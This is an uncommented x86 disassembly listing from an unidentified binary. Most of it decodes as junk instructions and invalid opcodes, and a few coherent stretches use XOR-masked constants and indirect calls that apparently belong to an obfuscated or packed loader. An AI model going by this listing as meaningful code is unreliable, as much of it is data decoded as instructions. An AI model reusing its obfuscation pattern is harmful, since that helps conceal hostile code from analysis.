  40dbd1:	mov    edx,0x3e02bf62
  40dbd6:	enter  0x949f,0xfd
  40dbda:	sbb    eax,0x398a8823
  40dbdf:	xchg   ecx,eax
  40dbe0:	mov    dh,0xca
  40dbe2:	inc    ecx
  40dbe3:	add    DWORD PTR [edx],edi
  40dbe5:	dec    ecx
  40dbe6:	leave  
  40dbe7:	test   eax,0x1d4a9f84
  40dbec:	xchg   edx,eax
  40dbed:	aaa    
  40dbee:	pop    esp
  40dbef:	cld    
  40dbf0:	xor    eax,0x69b41fa7
  40dbf5:	push   esp
  40dbf6:	pop    edx
  40dbf7:	sbb    al,0x14
  40dbf9:	test   al,0x9c
  40dbfb:	lock mov WORD PTR [edi],gs
  40dbfe:	in     eax,dx
  40dbff:	inc    ecx
  40dc00:	pop    eax
  40dc01:	nop
  40dc02:	jmp    0x2cd7:0xa50a869e
  40dc09:	mov    ds:0xc50645da,al
  40dc0e:	jno    0x40dc41
  40dc10:	rcl    BYTE PTR [ebx+0x16],0x7
  40dc14:	xchg   edi,eax
  40dc15:	dec    ecx
  40dc16:	gs push edi
  40dc18:	out    dx,eax
  40dc19:	bound  esi,QWORD PTR [ebp-0x4d39c59b]
  40dc1f:	or     cl,BYTE PTR [ecx-0x77139f65]
  40dc25:	pop    ecx
  40dc26:	loop   0x40dbb5
  40dc28:	or     dl,al
  40dc2a:	and    al,0x8d
  40dc2c:	ret    
  40dc2d:	addr16 push 0xffffffb1
  40dc30:	dec    ecx
  40dc31:	(bad)  
  40dc32:	mov    ah,0x89
  40dc34:	ins    BYTE PTR es:[edi],dx
  40dc35:	adc    DWORD PTR ds:0xb36912a6,ecx
  40dc3b:	add    DWORD PTR [edi+edi*8],0xffffffba
  40dc3f:	and    bh,BYTE PTR [ebp-0x77]
  40dc42:	out    0xa3,eax
  40dc44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc45:	leave  
  40dc46:	out    dx,eax
  40dc47:	dec    ebx
  40dc48:	mov    cl,0x85
  40dc4a:	cmp    al,0x73
  40dc4c:	sbb    BYTE PTR [edi-0x74f2f0a5],al
  40dc52:	mov    ecx,0xc6437a0
  40dc57:	push   esi
  40dc58:	gs cs pushf 
  40dc5b:	mov    ah,0x52
  40dc5d:	mov    ebp,0x9237a0f0
  40dc62:	es inc esp
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x5c383768]
  40dc7d:	out    dx,al
  40dc7e:	stos   DWORD PTR es:[edi],eax
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dc8b
  40dc88:	dec    ebp
  40dc89:	(bad)  
  40dc8a:	or     bl,BYTE PTR [ebp+0x439115f3]
  40dc90:	jne    0x40dcf7
  40dc92:	jne    0x40dc17
  40dc94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc95:	add    al,0xc0
  40dc97:	ficomp DWORD PTR [ebx+eiz*4]
  40dc9a:	push   ebp
  40dc9b:	loopne 0x40dca9
  40dc9d:	addr16 xchg edx,esi
  40dca0:	jne    0x40dca2
  40dca2:	shl    BYTE PTR [eax+edx*8],1
  40dca5:	popa   
  40dca6:	lock pop es
  40dca8:	mov    ds:0x18a1190b,eax
  40dcad:	cmp    bl,dl
  40dcaf:	out    0x67,al
  40dcb1:	jecxz  0x40dca2
  40dcb3:	shr    DWORD PTR [ecx],cl
  40dcb5:	fisttp DWORD PTR [edx+0x50f959ff]
  40dcbb:	sbb    eax,0x3998f08e
  40dcc0:	aad    0xe7
  40dcc2:	add    BYTE PTR [edx-0x7b],ah
  40dcc5:	push   edx
  40dcc6:	dec    edx
  40dcc7:	(bad)  
  40dcc8:	fmul   DWORD PTR [edi+ebx*4]
  40dccb:	shl    DWORD PTR [esi],1
  40dccd:	add    eax,0x7f5095ab
  40dcd2:	ret    0xc0d1
  40dcd5:	inc    ecx
  40dcd6:	div    DWORD PTR [ebp-0x71]
  40dcd9:	push   ds
  40dcda:	lods   eax,DWORD PTR ds:[esi]
  40dcdb:	popf   
  40dcdc:	inc    ecx
  40dcdd:	pop    esp
  40dcde:	push   es
  40dcdf:	sub    BYTE PTR [edx-0x18a4b33a],dl
  40dce5:	mov    ah,0x40
  40dce7:	aad    0x91
  40dce9:	shl    esp,0x72
  40dcec:	or     edx,DWORD PTR [esi-0x56]
  40dcef:	pop    ecx
  40dcf0:	xchg   ebp,eax
  40dcf1:	stc    
  40dcf2:	or     al,0x85
  40dcf4:	pop    edi
  40dcf5:	and    ch,BYTE PTR [edi-0x7f]
  40dcf8:	cmp    edi,DWORD PTR [ecx+esi*2-0x7cffdc64]
  40dcff:	fnstenv [ecx]
  40dd01:	addr16 xchg edx,eax
  40dd03:	xchg   BYTE PTR [ecx+ebp*4+0x496c54db],ch
  40dd0a:	mov    eax,ds:0xd2e5eac9
  40dd0f:	mov    dl,0x7b
  40dd11:	repz xchg edi,eax
  40dd13:	sub    eax,0x8fc55c1e
  40dd18:	cmc    
  40dd19:	push   eax
  40dd1a:	stos   DWORD PTR es:[edi],eax
  40dd1b:	mov    esi,0x73259876
  40dd20:	fnstcw WORD PTR ds:0x749c98b3
  40dd26:	stc    
  40dd27:	jle    0x40dce8
  40dd29:	sub    eax,0xdce9865b
  40dd2e:	and    BYTE PTR [edi],ah
  40dd30:	add    edi,eax
  40dd32:	or     bh,bl
  40dd34:	and    DWORD PTR [edx-0x29292c4f],ebp
  40dd3a:	and    BYTE PTR [edi-0x1d],ch
  40dd3d:	fwait
  40dd3e:	jae    0x40dd54
  40dd40:	adc    eax,0x3643da95
  40dd45:	mov    ds:0xbc69a1f0,eax
  40dd4a:	(bad)  
  40dd4b:	jb     0x40dd96
  40dd4d:	jle    0x40dd5b
  40dd4f:	packssdw mm1,QWORD PTR [ebx+edx*4+0x54]
  40dd54:	and    ebx,DWORD PTR [edx+0x9ce2937]
  40dd5a:	xchg   BYTE PTR [ebp-0x39fdd6d1],ch
  40dd60:	xor    dh,BYTE PTR [ebx]
  40dd62:	jl     0x40dd2c
  40dd64:	clc    
  40dd65:	pop    esp
  40dd66:	lea    edi,[eax+0x32]
  40dd69:	nop
  40dd6a:	aad    0xc9
  40dd6c:	fidivr DWORD PTR [esi-0x24295e8a]
  40dd72:	in     eax,dx
  40dd73:	adc    cl,al
  40dd75:	jmp    0x4453657b
  40dd7a:	jecxz  0x40ddbf
  40dd7c:	(bad)  
  40dd7d:	adc    ecx,ebp
  40dd7f:	loope  0x40dd9b
  40dd81:	sbb    dl,BYTE PTR [eax]
  40dd83:	outs   dx,BYTE PTR ds:[esi]
  40dd84:	cdq    
  40dd85:	adc    dh,bh
  40dd87:	jno    0x40ddf5
  40dd89:	pop    es
  40dd8a:	add    eax,0xbfeafccf
  40dd8f:	and    DWORD PTR [ecx],0x1dc9b027
  40dd95:	addr16 and al,0x7d
  40dd98:	pop    ebp
  40dd99:	xlat   BYTE PTR ds:[ebx]
  40dd9a:	(bad)  
  40dd9b:	in     al,dx
  40dd9c:	inc    ecx
  40dd9d:	sub    edi,DWORD PTR [eax+eiz*4-0x1a]
  40dda1:	aaa    
  40dda2:	mov    WORD PTR [ebp-0x4a3ff2a7],ds
  40dda8:	push   ecx
  40dda9:	fisub  WORD PTR [ebp-0x2]
  40ddac:	mov    BYTE PTR [edx+ebx*1+0x180b2a7d],0x5e
  40ddb4:	cmp    bh,BYTE PTR [ebx-0x6ccdb7de]
  40ddba:	push   esi
  40ddbb:	dec    edi
  40ddbc:	lea    esi,ds:0xf0f08b9e
  40ddc2:	ins    DWORD PTR es:[edi],dx
  40ddc3:	sti    
  40ddc4:	sbb    DWORD PTR [edx],esp
  40ddc6:	push   ecx
  40ddc7:	sbb    ebp,ecx
  40ddc9:	arpl   di,sp
  40ddcb:	fnstcw WORD PTR [ebp-0x26]
  40ddce:	retf   
  40ddcf:	test   eax,0xa02d812f
  40ddd4:	xchg   esi,eax
  40ddd5:	cld    
  40ddd6:	sar    BYTE PTR [edx+esi*4],cl
  40ddd9:	repz push eax
  40dddb:	aam    0x50
  40dddd:	mov    WORD PTR ds:0x38774ad6,fs
  40dde3:	xor    DWORD PTR [edx],ebp
  40dde5:	inc    ecx
  40dde6:	push   esp
  40dde7:	push   ss
  40dde8:	sub    ebx,DWORD PTR [ebp+0x37]
  40ddeb:	xor    cl,BYTE PTR [esi+eiz*1]
  40ddee:	adc    ecx,DWORD PTR [ebx-0x50174f6c]
  40ddf4:	sub    al,BYTE PTR [ecx]
  40ddf6:	add    cl,BYTE PTR [eax-0x8]
  40ddf9:	fwait
  40ddfa:	out    0x24,eax
  40ddfc:	and    esp,edx
  40ddfe:	push   0xffffff91
  40de00:	mov    edx,0xc9c00880
  40de05:	mov    esi,0x3c6b9073
  40de0a:	mov    cl,BYTE PTR [edx-0x7d09557b]
  40de10:	pop    es
  40de11:	jno    0x40de13
  40de13:	inc    ecx
  40de14:	test   BYTE PTR [edi+0x2f],bh
  40de17:	mov    edx,0xf2f39436
  40de1c:	mov    ebp,ds
  40de1e:	rcr    BYTE PTR [ecx+0x3e6abc9e],1
  40de24:	xor    esp,DWORD PTR [esi+eiz*4]
  40de27:	cmp    DWORD PTR [ebx-0x5ce11d],esp
  40de2d:	fmul   QWORD PTR [esi]
  40de2f:	aam    0x20
  40de31:	dec    esi
  40de32:	mov    al,0x3c
  40de34:	jmp    0xeb1e:0x259aa0e6
  40de3b:	jo     0x40de15
  40de3d:	add    ebp,DWORD PTR [ecx-0x21]
  40de40:	not    DWORD PTR [esi-0x1a]
  40de43:	jmp    0xcbe7:0x5ce4a0e6
  40de4a:	addr16 push esi
  40de4c:	push   0x7d1791ee
  40de51:	test   DWORD PTR [eax-0x9695af9],esi
  40de57:	cmp    edi,edi
  40de59:	cmp    ah,BYTE PTR [edx+0x7c]
  40de5c:	cmp    al,0x62
  40de5e:	int    0xb2
  40de60:	fild   WORD PTR [eax+0x51]
  40de63:	pop    ecx
  40de64:	popf   
  40de65:	sbb    eax,0x766058ea
  40de6a:	or     esi,ecx
  40de6c:	mov    ch,0x7
  40de6e:	push   ebx
  40de6f:	jns    0x40de8a
  40de71:	mov    WORD PTR [esi-0x4a0383ee],?
  40de77:	sub    esp,esp
  40de79:	adc    ah,BYTE PTR [eax-0x56]
  40de7c:	int3   
  40de7d:	(bad)  
  40de7e:	sbb    bh,BYTE PTR [ecx]
  40de80:	or     bh,BYTE PTR [esi]
  40de82:	arpl   WORD PTR [ebx+0x25],di
  40de85:	jae    0x40dee1
  40de87:	imul   ecx,DWORD PTR [esi+0x20],0xffffffde
  40de8b:	ja     0x40de36
  40de8d:	mov    eax,0x80155364
  40de92:	ret    
  40de93:	jmp    0x187a:0x62b88f93
  40de9a:	clc    
  40de9b:	repz aas 
  40de9d:	push   es
  40de9e:	sti    
  40de9f:	add    eax,0x69849863
  40dea4:	inc    esp
  40dea5:	rol    BYTE PTR [edi-0x4ddb805],0x8b
  40deac:	hlt    
  40dead:	inc    ebp
  40deae:	pop    esp
  40deaf:	xchg   edx,eax
  40deb0:	adc    BYTE PTR [esi-0x731a2b48],0x5f
  40deb7:	iret   
  40deb8:	mov    esi,0x3727a377
  40debd:	ins    DWORD PTR es:[edi],dx
  40debe:	xchg   ebx,eax
  40debf:	ret    0x2df1
  40dec2:	leave  
  40dec3:	rcr    DWORD PTR [ecx+eiz*8-0x32b03c0f],cl
  40deca:	mov    eax,ds:0x5c7f7811
  40decf:	test   BYTE PTR [edi+0x7a570f1b],ah
  40ded5:	lock leave 
  40ded7:	leave  
  40ded8:	xor    dl,BYTE PTR [ecx]
  40deda:	jne    0x40ded2
  40dedc:	jne    0x40de89
  40dede:	sub    edx,DWORD PTR [edi]
  40dee0:	sbb    ebp,0xffffffda
  40dee3:	cld    
  40dee4:	lock lock fdivrp st(3),st
  40dee8:	push   edi
  40dee9:	mov    DWORD PTR ds:0x8e578eb0,ecx
  40deef:	rol    BYTE PTR [edx+0x6],0x7b
  40def3:	sahf   
  40def4:	retf   
  40def5:	lods   al,BYTE PTR ds:[esi]
  40def6:	pop    esi
  40def7:	sub    ah,BYTE PTR [ebp-0x17]
  40defa:	stos   BYTE PTR es:[edi],al
  40defb:	dec    ecx
  40defc:	ins    BYTE PTR es:[edi],dx
  40defd:	jg     0x40df7e
  40deff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df00:	adc    BYTE PTR [eax-0x74],dl
  40df03:	stos   DWORD PTR es:[edi],eax
  40df04:	mov    ds:0x8bfe043e,eax
  40df09:	mov    esp,0x66cedd56
  40df0e:	xchg   ebp,eax
  40df0f:	mov    al,0x90
  40df11:	sbb    dh,bh
  40df13:	les    esp,FWORD PTR [edi-0x5f]
  40df16:	(bad)  
  40df17:	cli    
  40df18:	mov    eax,0x722c6ada
  40df1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df1e:	jnp    0x40df8c
  40df20:	shr    BYTE PTR [eax-0x70],1
  40df23:	jecxz  0x40df45
  40df25:	sti    
  40df26:	test   BYTE PTR es:[eax],ah
  40df29:	push   ebp
  40df2a:	int    0xc0
  40df2c:	repz (bad) 
  40df2e:	mov    bh,0xfb
  40df30:	inc    ebp
  40df31:	fistp  WORD PTR ds:0x2b0ffd65
  40df37:	cdq    
  40df38:	inc    esp
  40df39:	out    0x67,al
  40df3b:	adc    ebx,DWORD PTR ds:0xab3e6aef
  40df41:	inc    ecx
  40df42:	or     DWORD PTR [ebp+0x55412fb8],ebp
  40df48:	pop    ds
  40df49:	imul   edi,DWORD PTR [ecx+0x60],0x943f36d6
  40df50:	push   es
  40df51:	jno    0x40dfa3
  40df53:	fld    TBYTE PTR [eax+0x30e625c4]
  40df59:	xchg   esi,eax
  40df5a:	inc    edx
  40df5b:	xor    ah,cl
  40df5d:	pop    DWORD PTR [edx-0x1e0d47a0]
  40df63:	mov    ebx,DWORD PTR [esi+0x57b036e3]
  40df69:	jnp    0x40df42
  40df6b:	push   eax
  40df6c:	cmp    BYTE PTR [ecx+0x745b6c4d],dh
  40df72:	stc    
  40df73:	cmp    eax,edi
  40df75:	call   ebp
  40df77:	pop    esp
  40df78:	mov    ch,0xfe
  40df7a:	pop    esi
  40df7b:	fld    TBYTE PTR ds:0x55c1c3aa
  40df81:	(bad)  
  40df82:	adc    ah,bh
  40df84:	mov    WORD PTR ds:0x36180be4,ds
  40df8a:	mov    DWORD PTR [edi+edx*4],eax
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	setbe  BYTE PTR cs:[edx]
  40e026:	lock or eax,0x7e7e9930
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	adc    edi,DWORD PTR [esi-0x45]
  40e033:	pop    edi
  40e034:	aaa    
  40e035:	lahf   
  40e036:	test   BYTE PTR [edx-0x3864b4bc],dl
  40e03c:	cdq    
  40e03d:	and    ebx,DWORD PTR [ebp-0x609ac249]
  40e043:	push   ebp
  40e044:	bnd jno 0x40dffd
  40e047:	mov    eax,ds:0xe23d50b9
  40e04c:	adc    eax,0x14dff2ba
  40e051:	sbb    eax,esp
  40e053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e054:	mov    edx,DWORD PTR fs:[esi]
  40e057:	shr    BYTE PTR [edi-0x534020c9],cl
  40e05d:	mov    edx,0xc050e517
  40e062:	sbb    BYTE PTR [ebp-0x4e],dl
  40e065:	out    dx,eax
  40e066:	pop    edi
  40e067:	int    0xe5
  40e069:	xchg   ebp,eax
  40e06a:	iret   
  40e06b:	dec    ebx
  40e06c:	inc    eax
  40e06d:	pop    ecx
  40e06e:	inc    ebp
  40e06f:	or     DWORD PTR [edx],ecx
  40e071:	pop    ebp
  40e072:	xchg   esi,eax
  40e073:	(bad)  [esi+edx*2-0x70]
  40e077:	xor    al,0xce
  40e079:	sub    BYTE PTR [ecx-0x4d1d3000],dh
  40e07f:	mov    ebx,0x87cb0d3a
  40e084:	aaa    
  40e085:	mov    WORD PTR [eax-0x39],ds
  40e088:	(bad)  [esi]
  40e08a:	mov    al,ds:0x3f49b748
  40e08f:	into   
  40e090:	mov    bh,0xa9
  40e092:	test   DWORD PTR ds:0xf77e7fef,ebp
  40e098:	aaa    
  40e099:	sbb    eax,DWORD PTR ds:0xba09dafa
  40e09f:	xor    DWORD PTR [ecx+0x512a61cc],esp
  40e0a5:	fsub   DWORD PTR [ebp-0x47c7b9f1]
  40e0ab:	add    al,0x12
  40e0ad:	jge    0x40e067
  40e0af:	sub    BYTE PTR [ebx],dh
  40e0b1:	pop    ebx
  40e0b2:	mov    esp,0x48ac77ab
  40e0b7:	hlt    
  40e0b8:	lods   eax,DWORD PTR ds:[esi]
  40e0b9:	add    bh,0xaa
  40e0bc:	sub    al,BYTE PTR [ecx+ebx*8+0xbb684f2]
  40e0c3:	scas   eax,DWORD PTR es:[edi]
  40e0c4:	or     eax,0x8234ac01
  40e0c9:	ret    
  40e0ca:	pop    esi
  40e0cb:	ds jbe 0x40e110
  40e0ce:	xchg   ebp,ebp
  40e0d0:	jbe    0x40e079
  40e0d2:	stos   DWORD PTR es:[edi],eax
  40e0d3:	dec    ebp
  40e0d4:	sbb    eax,0x9e15587c
  40e0d9:	not    DWORD PTR [ebp+0x141146df]
  40e0df:	pop    es
  40e0e0:	not    DWORD PTR ds:0xa9387466
  40e0e6:	fild   QWORD PTR [edx+ebp*2]
  40e0e9:	loop   0x40e10a
  40e0eb:	cmp    bh,BYTE PTR [bx+di+0x17]
  40e0ef:	in     al,dx
  40e0f0:	cmp    ebx,DWORD PTR [edi-0x62e6d592]
  40e0f6:	jecxz  0x40e146
  40e0f8:	xchg   esp,eax
  40e0f9:	loope  0x40e0e7
  40e0fb:	or     dl,BYTE PTR [edi+0xefb16d4]
  40e101:	xor    cl,BYTE PTR [eax]
  40e103:	enter  0x2fbe,0x64
  40e107:	std    
  40e108:	xchg   ebx,eax
  40e109:	cmc    
  40e10a:	jle    0x40e13d
  40e10c:	or     edx,DWORD PTR [ecx-0x6a81e7aa]
  40e112:	mov    ds:0x115582a6,al
  40e117:	add    esi,DWORD PTR [ebx]
  40e119:	mov    dl,0x5f
  40e11b:	or     al,0xab
  40e11d:	es inc eax
  40e11f:	idiv   esp
  40e121:	mov    dl,0x3b
  40e123:	sub    eax,0xbb5f6771
  40e128:	std    
  40e129:	jl     0x40e119
  40e12b:	or     al,0x3
  40e12d:	push   edx
  40e12e:	es enter 0x3cd9,0xfb
  40e133:	int3   
  40e134:	or     dh,bh
  40e136:	cdq    
  40e137:	sti    
  40e138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e139:	repnz (bad) 
  40e13b:	pop    ebx
  40e13c:	sbb    DWORD PTR [edx+0x3377fca6],0xffffff82
  40e143:	pop    eax
  40e144:	dec    edx
  40e145:	mov    DWORD PTR [ebx+0xa],ebp
  40e148:	in     al,0x28
  40e14a:	stos   DWORD PTR es:[edi],eax
  40e14b:	fstp   DWORD PTR [esi-0x2d]
  40e14e:	mov    al,ds:0xfd859774
  40e153:	dec    ebp
  40e154:	xor    eax,DWORD PTR [eax+esi*8-0x74]
  40e158:	and    al,bl
  40e15a:	(bad)  
  40e15b:	jg     0x40e0e3
  40e15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e15e:	mov    edi,0xec3facaa
  40e163:	mov    dh,BYTE PTR [ebx+ebp*8+0x319ee341]
  40e16a:	mov    BYTE PTR [edx+esi*1],al
  40e16d:	addr16 jmp 0xaad8:0x1111de3e
  40e175:	xor    al,0x16
  40e177:	rol    BYTE PTR [edx-0x1500c7bf],0x4c
  40e17e:	adc    al,0x34
  40e180:	frstor [esp+esi*1+0x6a]
  40e184:	and    eax,0x1a7ea3e
  40e189:	xor    eax,0x2d22d1be
  40e18e:	cdq    
  40e18f:	out    0x6b,al
  40e191:	jnp    0x40e13a
  40e193:	adc    ah,cl
  40e195:	not    DWORD PTR [ecx-0x7a]
  40e198:	dec    esi
  40e199:	sbb    BYTE PTR [ebp-0x49],0xee
  40e19d:	dec    ebx
  40e19e:	sub    BYTE PTR [ecx],dl
  40e1a0:	mov    ebp,0x60a8259c
  40e1a5:	fsubr  DWORD PTR [esi+eiz*1+0xd]
  40e1a9:	mov    DWORD PTR [edx],edx
  40e1ab:	(bad)  
  40e1ac:	fcomp  QWORD PTR [ebx-0x50d87402]
  40e1b2:	pmovmskb edx,mm4
  40e1b5:	pop    es
  40e1b6:	mov    dl,0x74
  40e1b8:	ffree  st(1)
  40e1ba:	loopne 0x40e18d
  40e1bc:	mov    al,ds:0x6427be94
  40e1c1:	popf   
  40e1c2:	pushf  
  40e1c3:	push   cs
  40e1c4:	cmp    DWORD PTR [ebp+0x30ff323e],0xccedcc0c
  40e1ce:	and    eax,0x57b5f5e1
  40e1d3:	int    0x3
  40e1d5:	add    eax,0xe2532050
  40e1da:	ins    BYTE PTR es:[edi],dx
  40e1db:	mov    BYTE PTR [esi-0x4810557c],bh
  40e1e1:	test   al,0x2c
  40e1e3:	dec    ecx
  40e1e4:	ret    
  40e1e5:	iret   
  40e1e6:	and    cl,BYTE PTR [ecx+0x1b]
  40e1e9:	adc    eax,0x9f44091e
  40e1ee:	cmp    eax,0x97100b6c
  40e1f3:	loop   0x40e207
  40e1f5:	ds mov ebp,0x42f5a4fe
  40e1fb:	test   eax,0x43126a11
  40e200:	or     ecx,DWORD PTR [ebp+0x1d]
  40e203:	mov    dh,dl
  40e205:	sbb    DWORD PTR [esi-0x4f1d8c4d],ebp
  40e20b:	out    0xd5,al
  40e20d:	push   cs
  40e20e:	shr    DWORD PTR [ebx],cl
  40e210:	ret    0xf614
  40e213:	cmp    BYTE PTR [ebx-0x1b4c8ca5],cl
  40e219:	push   edx
  40e21a:	add    DWORD PTR [edi-0x35dbfd29],ebp
  40e220:	dec    ebp
  40e221:	mov    esi,0xdcb21ec4
  40e226:	fsub   DWORD PTR [ecx-0x184e65f9]
  40e22c:	aas    
  40e22d:	inc    esi
  40e22e:	mov    WORD PTR [ecx],es
  40e230:	xchg   edx,eax
  40e231:	fadd   QWORD PTR [ebx+0x3aa001a4]
  40e237:	ja     0x40e229
  40e239:	jno    0x40e1bb
  40e23b:	test   al,0xfd
  40e23d:	and    DWORD PTR [esi+0xb0a607a],0xffffffed
  40e244:	stc    
  40e245:	inc    esp
  40e246:	xchg   edi,eax
  40e247:	push   esp
  40e248:	adc    ebp,DWORD PTR ds:0x515ab307
  40e24e:	lea    edx,[esi]
  40e250:	push   esi
  40e251:	imul   ebx,DWORD PTR [esi+ebp*2],0xfffffffc
  40e255:	mov    dl,0xd1
  40e257:	jle    0x40e209
  40e259:	jo     0x40e1f4
  40e25b:	push   esp
  40e25c:	out    0x3e,al
  40e25e:	ror    BYTE PTR [edi-0x16],1
  40e261:	test   DWORD PTR [edi+0x1f],esp
  40e264:	daa    
  40e265:	and    edi,DWORD PTR [ebx+0x52cfaec4]
  40e26b:	lar    eax,sp
  40e26e:	loope  0x40e266
  40e270:	out    dx,al
  40e271:	ret    
  40e272:	(bad)  
  40e273:	(bad)  
  40e274:	mov    ah,0x95
  40e276:	jg     0x40e2da
  40e278:	test   al,0xc5
  40e27a:	packssdw mm7,QWORD PTR [edi+eax*8-0x2ba8ee0c]
  40e282:	xor    eax,0x6b4563ab
  40e287:	mov    esi,0xf66b341
  40e28c:	jle    0x40e2fd
  40e28e:	xor    DWORD PTR [eax+0x8882d71],eax
  40e294:	call   0x8a6cff43
  40e299:	add    DWORD PTR [esi+0x5c5f2c47],esp
  40e29f:	rol    DWORD PTR [edx-0x1],0x44
  40e2a3:	int3   
  40e2a4:	mov    bh,0xcd
  40e2a6:	pop    es
  40e2a7:	adc    dl,BYTE PTR [edi]
  40e2a9:	and    BYTE PTR [edi],dh
  40e2ab:	sbb    BYTE PTR [bx+di+0x4985],0x84
  40e2b1:	add    ecx,DWORD PTR [ecx-0x56]
  40e2b4:	sub    dl,BYTE PTR [esi+0x73]
  40e2b7:	test   eax,0x1b855500
  40e2bc:	mov    ebp,eax
  40e2be:	(bad)  
  40e2bf:	mov    ebp,0x26aaf940
  40e2c4:	and    cl,BYTE PTR [eax+0x79d0992f]
  40e2ca:	jmp    0x40e34b
  40e2cc:	test   BYTE PTR [esi],ch
  40e2ce:	xchg   esp,eax
  40e2cf:	stc    
  40e2d0:	not    edx
  40e2d2:	lds    eax,FWORD PTR [ecx-0x2e]
  40e2d5:	mov    ecx,0x7c6d8d3e
  40e2da:	imul   ebx,esi,0x3a5f1c41
  40e2e0:	mov    eax,ds:0x1e193f14
  40e2e5:	mov    ecx,0x61971c9e
  40e2ea:	xor    al,0xc5
  40e2ec:	imul   ebx,DWORD PTR [eax-0x2],0x7b119e55
  40e2f3:	cld    
  40e2f4:	mov    eax,0xb9d5dedc
  40e2f9:	dec    esp
  40e2fa:	inc    ebp
  40e2fb:	or     DWORD PTR [edi],edx
  40e2fd:	sti    
  40e2fe:	jno    0x40e306
  40e300:	xchg   ebp,edx
  40e302:	jne    0x40e2d7
  40e304:	shl    edi,1
  40e306:	fadd   st(3),st
  40e308:	xor    edx,DWORD PTR [edx+0x1de64357]
  40e30e:	data16 daa 
  40e310:	repz add dh,BYTE PTR [ebp+0x7d6ef418]
  40e317:	adc    DWORD PTR [ecx+ecx*8+0x1c90533f],edx
  40e31e:	hlt    
  40e31f:	pusha  
  40e320:	add    ch,ch
  40e322:	aaa    
  40e323:	push   0xffffffc0
  40e325:	jl     0x40e33b
  40e327:	test   eax,0x788fc790
  40e32c:	fadd   DWORD PTR [ecx-0x3e3634a3]
  40e332:	xchg   edi,eax
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	dec    DWORD PTR [edi+eax*1-0x5bc019e2]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3d6
